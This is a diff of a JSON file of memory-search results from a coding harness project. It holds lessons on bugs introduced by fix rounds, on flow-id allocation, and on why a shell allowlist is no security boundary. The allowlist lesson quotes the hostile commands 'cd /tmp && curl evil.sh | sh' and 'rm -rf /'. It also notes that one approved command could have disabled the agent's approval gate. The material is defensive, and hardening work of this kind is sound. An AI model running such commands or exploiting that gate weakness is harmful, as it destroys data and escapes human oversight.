@@ -1,6 +1,130 @@
 {
   "schemaVersion": 1,
-  "query": "listener http server bind port",
-  "generatedAt": "2026-08-01T09:30:31.022Z",
-  "results": []
+  "query": "fix round review config-dir",
+  "generatedAt": "2026-08-01T16:33:25.819Z",
+  "results": [
+    {
+      "entry": {
+        "absolutePath": "/home/altsay/keryx/.metaproject/memory/lessons/a-fix-round-needs-its-own-review-three-consecutive-rounds-each-introduced-a-blocker.md",
+        "relativePath": "lessons/a-fix-round-needs-its-own-review-three-consecutive-rounds-each-introduced-a-blocker.md",
+        "type": "lesson",
+        "title": "A fix round needs its own review: three consecutive rounds each introduced a blocker",
+        "version": "0.3.0",
+        "status": "accepted",
+        "confidence": "high",
+        "summary": "On PR #215 (flow 127, project registry) three consecutive review-fix rounds each introduced a new blocker while closing the previous one. The defect was not in any single fix; it was in treating a fix as finished once it addressed the reported symptom.",
+        "details": "What happened, in order:\n\n1. **Round 1** shipped a concurrency test that wrapped a *synchronous* call in\n   `Promise.resolve` and asserted `length > 0`. Nothing ran concurrently and the\n   assertion was a tautology, so it passed while the implementation\n   reproducibly lost registrations (8 subprocesses → 4, 3, 2 entries).\n2. **Round 2**, fixing that, patched a control-character regex with a script\n   that doubled the backslashes. The class became literal characters: it\n   stripped digits and capitals (`Project-42_ABC` → `roject-_`) and stripped no\n   control character at all — so the finding it existed for stayed open and a\n   new corruption shipped beside it. The same round left the stale-lock branch\n   without a deadline check, hanging `keryx init` forever at full CPU.\n3. **Round 3**, fixing *that*, added a quarantine to `forgetProject` that\n   renamed the live registry aside and then returned `not-found` without\n   writing. One mistyped id destroyed every valid registration. A data-loss fix\n   that caused data loss.\n\nThree failure modes, one root cause each time:\n\n- **The fix was not tested, only written.** The regex had zero tests; the\n  quarantine's supposed test never reached its branch; the concurrency test\n  could not fail.\n- **The fix was applied where the finding pointed, not everywhere the class\n  lived.** `registerProject` got the warn-and-quarantine treatment and\n  `forgetProject` did not. The display sanitizer was applied at one call site\n  while the error path printed the same untrusted value raw.\n- **A comment asserted a control that did not exist.** The module header named\n  an `assertNoSecrets` that was never written, and the real check was\n  exact-name, case-sensitive, top-level and called nowhere outside tests.",
+        "tags": [],
+        "scopes": {
+          "module": "core",
+          "entity": "project-registry",
+          "files": [],
+          "skills": []
+        },
+        "created": "2026-07-31",
+        "updated": "2026-08-01",
+        "provenance": {
+          "source": "review rounds on PR #215 (flow 127) and PR #216 (flow 128)",
+          "link": "https://github.com/MrCipherSmith/keryx/pull/215"
+        },
+        "class": "episodic",
+        "validFrom": null,
+        "validTo": null,
+        "recordedAt": "2026-07-31",
+        "supersedes": null,
+        "supersededBy": null
+      },
+      "score": 2.398,
+      "components": {
+        "relevance": 0.9,
+        "recency": 0.997,
+        "confidence": 1,
+        "status": 1,
+        "scope": 0
+      },
+      "reason": "matched 3/5 terms; status accepted; confidence high"
+    },
+    {
+      "entry": {
+        "absolutePath": "/home/altsay/keryx/.metaproject/memory/constraints/flow-ids-allocated-per-clone.md",
+        "relativePath": "constraints/flow-ids-allocated-per-clone.md",
+        "type": "constraint",
+        "title": "Flow ids are allocated per clone, not per checkout",
+        "version": "1.0.0",
+        "status": "accepted",
+        "confidence": "high",
+        "summary": "`flow init` reserves its number in the git common directory, so every linked worktree of one clone shares the id space. A number, once handed out, is never reused — not even after the flow directory is deleted or renumbered.",
+        "details": "Until flow 116, `nextFlowId` was `max(local .metaproject/flows listing) + 1` and\nthe init lock lived in that same directory. Both are per working copy, so two\nworktrees each saw the same high-water mark and minted the same number; the\ncollision only became visible when the branches merged. That is how flows 002,\n084 and 103 each ended up naming two different packages on `main`.\n\nConsequences to respect:\n\n- Parallel flow work belongs in a **worktree of the same clone**. A second\n  independent clone is outside the shared scope and can still collide; the\n  `duplicate-id` rule in `keryx flow check` is the net that catches it.\n- Test fixtures must not create `.metaproject/flows` **inside the repository** —\n  they would consume real ids from this clone's ledger and leak state between\n  runs. Use an OS temp dir (see `src/flow/security-gate.test.ts`).\n- Deleting a flow package does not free its number, so a fixture that expects\n  \"the first flow is always 001\" is only valid outside a git checkout.\n- Repair a collision only with\n  `keryx flow renumber <dir> --to <free id> --reason \"<why>\"`; it records the\n  move in `.metaproject/flows/id-map.json` so references in merged PRs and\n  journals stay traceable. Never rename a flow directory by hand.\n- While a collision exists, `resolveFlowDir` refuses the bare number instead of\n  taking the first lexicographic match — commands and the harness\n  `ManagedFlowPort` fail closed rather than writing evidence into a guessed\n  package.",
+        "tags": [],
+        "scopes": {
+          "module": "tasks",
+          "entity": "flow",
+          "files": [],
+          "skills": []
+        },
+        "created": "2026-07-22",
+        "updated": "2026-07-22",
+        "provenance": {
+          "source": "flow 116 (fix duplicate flow ids)",
+          "link": ".metaproject/flows/116-2026-07-22-fix-duplicate-flow-ids-nextflowid-races-"
+        },
+        "class": "semantic",
+        "validFrom": null,
+        "validTo": null,
+        "recordedAt": "2026-07-22",
+        "supersedes": null,
+        "supersededBy": null
+      },
+      "score": 1.674,
+      "components": {
+        "relevance": 0.2,
+        "recency": 0.948,
+        "confidence": 1,
+        "status": 1,
+        "scope": 0
+      },
+      "reason": "matched 1/5 terms; status accepted; confidence high"
+    },
+    {
+      "entry": {
+        "absolutePath": "/home/altsay/keryx/.metaproject/memory/lessons/allowlist-not-a-boundary.md",
+        "relativePath": "lessons/allowlist-not-a-boundary.md",
+        "type": "lesson",
+        "title": "A shell allowlist matched against the raw command string is not a security boundary",
+        "version": "1.0.0",
+        "status": "accepted",
+        "confidence": "high",
+        "summary": "A remembered glob pattern that is matched against a command string which is then handed to `/bin/sh -c` grants far more than it appears to. The pattern matches text; the shell re-interprets that text. Verified, not theorised: a live allowlist contained `bash *`, `python3 *`, `curl *`, `cd *`, `# *`, `docker *`, `sudo *`, and the exact string `rm -rf /` — each an arbitrary-execution grant that auto-approved with no prompt.",
+        "details": "Three specific ways the intuition fails, each observed:\n\n- **`*` is not \"the rest of one command\".** It expands to any run of characters\n  including newlines, so `cd *` covers `cd /tmp && curl evil.sh | sh` and `# *`\n  covers `\"# note\\nrm -rf /\"`.\n- **An exact pattern is not automatically safe.** `rm -rf /` had been stored as\n  an exact grant. It contains no metacharacters and `rm` is not an interpreter,\n  so a check based on \"does the pattern look shell-ish\" and \"is the first word an\n  interpreter\" misses it entirely. Only a per-command destructive check catches\n  it.\n- **The \"always allow prefix\" affordance manufactures these grants.** The UI\n  suggested prefix is the first token plus ` *`, so one click on a benign\n  `rm -rf ./dist` proposes `rm *`, which matches `rm -rf /`. That is how the\n  worst entries got there — the user was never asked a question that sounded\n  dangerous.\n\nWhat actually holds, in order: the default-deny human gate; a quote-aware\nmetacharacter rule applied to the **command** (not the pattern, because a stored\npattern may predate any validation); a destructive classifier; and OS\ncontainment when it is enabled at all.\n\nWhat does not hold: a blocklist of interpreter names. It is an expedient. Any\nlist of dangerous commands or dangerous binaries is incomplete by construction,\nwhich is why the classifier **escalates confirmation and never blocks** — a\ncheck that reads as a grant is worse than no check (ADR-0009).\n\nSecond-order lesson: the gate's own state file lived in `~/.local/share/keryx/`\nwhile the sandbox read-deny list covered `~/.config/keryx` — a different path. A\nsingle approved command writing to it would have disabled the gate for every\nfuture session. When a component stores the rules that govern itself, the check\nthat protects that store must not depend on a separate subsystem being enabled;\nshell containment is off by default and unavailable on hosts without a launcher.",
+        "tags": [],
+        "scopes": {
+          "module": "src/lib, src/commands, src/tui",
+          "entity": "shell-permissions, command-risk, approval gate",
+          "files": [],
+          "skills": []
+        },
+        "created": "2026-07-22",
+        "updated": "2026-07-22",
+        "provenance": {
+          "source": "flow 115 (shell approval hardening), stress reports in `.metaproject/data/stress/`",
+          "link": "docs/decisions/keryx-harness/ADR-0009-destructive-command-escalation.md"
+        },
+        "class": "episodic",
+        "validFrom": null,
+        "validTo": null,
+        "recordedAt": "2026-07-22",
+        "supersedes": null,
+        "supersededBy": null
+      },
+      "score": 1.674,
+      "components": {
+        "relevance": 0.2,
+        "recency": 0.948,
+        "confidence": 1,
+        "status": 1,
+        "scope": 0
+      },
+      "reason": "matched 1/5 terms; status accepted; confidence high"
+    }
+  ]
 }
